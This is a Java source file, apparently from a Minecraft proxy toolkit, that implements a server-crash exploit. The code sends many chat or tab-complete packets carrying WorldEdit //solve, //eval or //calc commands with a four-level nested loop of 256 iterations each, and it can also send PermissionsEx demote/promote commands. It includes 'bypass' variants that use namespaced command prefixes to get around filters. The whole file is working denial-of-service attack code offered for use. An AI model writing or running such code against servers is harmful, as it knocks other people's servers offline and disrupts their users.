package me.ANONIMUS.proxy.exploits;

import me.ANONIMUS.proxy.objects.Exploit;
import me.ANONIMUS.proxy.protocol.objects.Player;
import me.ANONIMUS.proxy.protocol.packet.Packet;
import me.ANONIMUS.proxy.protocol.packet.impl.client.play.ClientChatPacket;
import me.ANONIMUS.proxy.protocol.packet.impl.client.play.ClientTabCompletePacket;
import me.ANONIMUS.proxy.utils.ChatUtil;

import java.util.stream.IntStream;

public class ShitExploit extends Exploit {
    public ShitExploit() {
        super("shit", "[amount] [mode(1:6)] [full(bool)] [bypass(bool)]", false);
    }

    @Override
    public Packet initPacket(Object... objects) {
        int mode = Integer.parseInt((String) objects[1]);
        boolean fullCMD = Boolean.parseBoolean((String) objects[2]);
        boolean bypass = Boolean.parseBoolean((String) objects[3]);

        String crashCMD = getCrashCommand(mode, fullCMD, bypass) + " for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}";

        if(mode == 6) {
            return new ClientTabCompletePacket(crashCMD + " ");
        }

        return new ClientChatPacket(crashCMD);
    }

    @Override
    public void execute(Player sender, Object... objects) {
        int amount = Integer.parseInt((String) objects[0]);
        ChatUtil.sendChatMessage(sender.getThemeType().getColor(1) + ">> &8Crashing started, method: " + sender.getThemeType().getColor(1) + getName().toUpperCase(), sender, false);
        final int time = (int) System.currentTimeMillis();
        Packet p = initPacket(objects);
        IntStream.range(0, amount).forEach(i -> sender.getRemoteSession().sendPacket(p));
        final int time2 = (int) System.currentTimeMillis() - time;
        ChatUtil.sendChatMessage(sender.getThemeType().getColor(1) + ">> &8Crashing complete &7(" + sender.getThemeType().getColor(2) + time2 + "ms&7)", sender, false);
    }

    private String getCrashCommand(final int mode, final boolean full, final boolean bypass) {
        switch (mode) {
            case 1: {
                return (bypass ? "/worldedit:/" : "//") + "solve";
            }
            case 2: {
                return (bypass ? "/worldedit:/" : "//") + (full ? "evaluate" : "eval");
            }
            case 3: {
                return (bypass ? "/worldedit:/" : "//") + (full ? "calculate" : "calc");
            }
            case 4: {
                return (full ? (bypass ? "/permissionsex:pex " : "/pex ") : "/") + "demote a a";
            }
            case 5: {
                return (full ? (bypass ? "/permissionsex:pex " : "/pex ") : "/") + "promote a a";
            }
            case 6: {
                return "/to";
            }
            default: return null;
        }
    }
}